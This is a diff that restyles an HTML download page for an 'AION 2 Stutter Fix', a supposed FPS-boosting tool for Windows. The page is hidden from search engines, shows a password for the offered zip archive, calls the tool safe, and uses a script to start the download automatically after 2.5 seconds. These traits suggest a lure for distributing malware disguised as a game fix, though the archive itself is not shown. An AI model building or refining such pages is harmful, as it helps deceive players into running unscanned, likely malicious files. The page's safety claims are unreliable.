@@ -6,110 +6,278 @@
     <title>AION 2 Stutter Fix 2026 — Download</title>
     <meta name="description" content="Download AION 2 Stutter Fix 2026. FPS boost, frame-time consistency, graphics presets.">
     <meta name="robots" content="noindex, nofollow">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #0a0e17;
-            --card-bg: rgba(17, 24, 39, 0.8);
-            --border: rgba(255, 255, 255, 0.08);
+            --bg: #09090b;
+            --card-bg: #18181b;
+            --border: #27272a;
+            --border-hover: #3f3f46;
             --accent: #3b82f6;
             --accent-hover: #2563eb;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --success: #10b981;
+            --text-main: #f4f4f5;
+            --text-muted: #a1a1aa;
         }
+
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
         body {
             background-color: var(--bg);
-            background-image: radial-gradient(circle at 50% 0%, rgba(59, 130, 246, 0.1), transparent 50%);
+            background-image: radial-gradient(circle at 50% 0%, rgba(59, 130, 246, 0.08), transparent 40%);
             color: var(--text-main);
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            min-height: 100vh; padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px;
         }
-        @keyframes popIn { 0% { opacity: 0; transform: scale(0.95) translateY(15px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .container {
-            background: var(--card-bg); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--border); border-radius: 20px; padding: 40px; max-width: 560px; width: 100%;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5); animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
-        .badge {
-            display: inline-block; background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3);
-            color: var(--accent); font-size: 0.75rem; font-weight: 700; padding: 4px 10px; border-radius: 6px;
-            margin-bottom: 16px; text-transform: uppercase; letter-spacing: 1px;
-        }
-        h1 { font-size: 2rem; font-weight: 700; line-height: 1.2; margin-bottom: 12px; letter-spacing: -0.02em; }
-        .subtitle { color: var(--text-muted); font-size: 1rem; line-height: 1.5; margin-bottom: 24px; }
-        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 32px; }
-        .feature-item { display: flex; align-items: center; gap: 8px; color: var(--text-main); font-size: 0.9rem; font-weight: 600; }
-        .feature-item svg { width: 16px; height: 16px; color: var(--accent); }
-        
-        .download-section {
-            background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 12px;
-        }
-        .password-container {
-            display: flex; align-items: center; justify-content: space-between;
-            background: rgba(59, 130, 246, 0.05); border: 1px dashed rgba(59, 130, 246, 0.3);
-            padding: 10px 16px; border-radius: 8px;
-        }
-        .password-label { font-size: 0.8rem; color: var(--text-muted); text-transform: uppercase; font-weight: 600; }
-        .password-value { font-family: monospace; font-size: 1.1rem; font-weight: 700; color: var(--accent); user-select: all; }
 
-        /* Та самая аккуратная кнопка */
-        .btn {
-            display: inline-flex; align-items: center; justify-content: center; gap: 8px;
-            background: var(--accent); color: #fff; padding: 12px 28px; border-radius: 8px;
-            text-decoration: none; font-weight: 600; font-size: 0.95rem;
-            transition: all 0.2s ease; cursor: pointer; border: none;
-            width: max-content; min-width: 200px; margin: 0 auto;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        .btn:hover { background: var(--accent-hover); transform: translateY(-1px); }
-        .status { display: none; text-align: center; color: var(--success); font-size: 0.85rem; font-weight: 600; margin-top: 4px; }
-        .spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
-        .footer { margin-top: 24px; font-size: 0.8rem; color: #52525b; text-align: center; }
-        
-        @media (max-width: 500px) { .features { grid-template-columns: 1fr; } .container { padding: 32px 24px; } h1 { font-size: 1.8rem; } .btn { width: 100%; } }
+
+        .container {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .icon-box {
+            width: 40px;
+            height: 40px;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        h1 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            letter-spacing: -0.01em;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 32px;
+        }
+
+        .feature-tag {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            font-size: 0.8rem;
+            font-weight: 500;
+            padding: 4px 10px;
+            border-radius: 6px;
+        }
+
+        .download-box {
+            background: #09090b;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            transition: border-color 0.2s ease;
+        }
+
+        .download-box:hover {
+            border-color: var(--border-hover);
+        }
+
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-left: 12px;
+        }
+
+        .file-icon {
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+        }
+
+        .file-icon svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .file-details {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .file-name {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--text-main);
+        }
+
+        .file-size {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        /* Аккуратная, маленькая кнопка */
+        .btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+        }
+
+        .btn:hover {
+            background: var(--accent-hover);
+        }
+
+        .btn svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .password-area {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 16px;
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.15);
+            border-radius: 8px;
+        }
+
+        .password-label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .password-value {
+            font-family: ui-monospace, SFMono-Regular, monospace;
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--accent);
+            background: rgba(0, 0, 0, 0.2);
+            padding: 4px 8px;
+            border-radius: 4px;
+            user-select: all;
+            cursor: pointer;
+        }
+
+        .status {
+            display: none;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        .spinner {
+            display: none;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 0.75rem;
+            color: #52525b;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 24px; }
+            .download-box { flex-direction: column; align-items: stretch; gap: 12px; padding: 12px; }
+            .file-info { padding-left: 0; }
+            .btn { justify-content: center; padding: 10px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="badge">Auto-Download Starting...</div>
-        <h1>AION 2 Stutter Fix 2026</h1>
+        <div class="header">
+            <div class="icon-box">⚡</div>
+            <h1>AION 2 Stutter Fix</h1>
+        </div>
+        
         <p class="subtitle">Eliminate stutters, boost FPS, and fix frame-time drops — without touching gameplay. Safe, external optimization.</p>
         
         <div class="features">
-            <div class="feature-item">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                <span>FPS & Frame-Time</span>
-            </div>
-            <div class="feature-item">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                <span>Shader Cache Cleanup</span>
-            </div>
-            <div class="feature-item">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                <span>Graphics Presets</span>
-            </div>
-            <div class="feature-item">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                <span>System Checks</span>
-            </div>
+            <span class="feature-tag">FPS Boost</span>
+            <span class="feature-tag">Frame-Time</span>
+            <span class="feature-tag">Shader Cache</span>
+            <span class="feature-tag">Graphics Presets</span>
         </div>
 
-        <div class="download-section">
-            <div class="password-container">
-                <span class="password-label">Archive Password</span>
-                <span class="password-value">6427910552</span>
+        <div class="download-box">
+            <div class="file-info">
+                <div class="file-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg>
+                </div>
+                <div class="file-details">
+                    <span class="file-name">Aion2StutterFix.zip</span>
+                    <span class="file-size">1.8 MB · Windows</span>
+                </div>
             </div>
             
             <a href="files/Aion2StutterFix.zip" download class="btn" id="downloadBtn">
                 <div class="spinner" id="spinner"></div>
                 <svg id="dlIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
-                <span id="btnText">Download Fix (1.8 MB)</span>
+                <span id="btnText">Download</span>
             </a>
-            <div class="status" id="status">✅ Download started! Check your downloads.</div>
         </div>
+
+        <div class="password-area">
+            <span class="password-label">Password</span>
+            <span class="password-value" title="Click to copy">6427910552</span>
+        </div>
+
+        <div class="status" id="status">Download started automatically.</div>
     </div>
     
     <p class="footer">© 2026 AION 2 Stutter Fix. For offline use only.</p>
@@ -132,18 +300,18 @@
             document.body.removeChild(a);
             
             status.style.display = 'block';
-            btnText.textContent = "Download Again";
+            btnText.textContent = "Again";
             spinner.style.display = 'none';
             dlIcon.style.display = 'block';
         }
 
-        // Автоскачка через 3 секунды
-        setTimeout(() => { triggerDownload(); }, 3000);
+        // Автоскачка через 2.5 секунды
+        setTimeout(() => { triggerDownload(); }, 2500);
 
         // Ручная кнопка
         btn.addEventListener('click', function(e) {
             e.preventDefault();
-            btnText.textContent = "Preparing...";
+            btnText.textContent = "...";
             dlIcon.style.display = 'none';
             spinner.style.display = 'block';
             setTimeout(() => { triggerDownload(); }, 500);
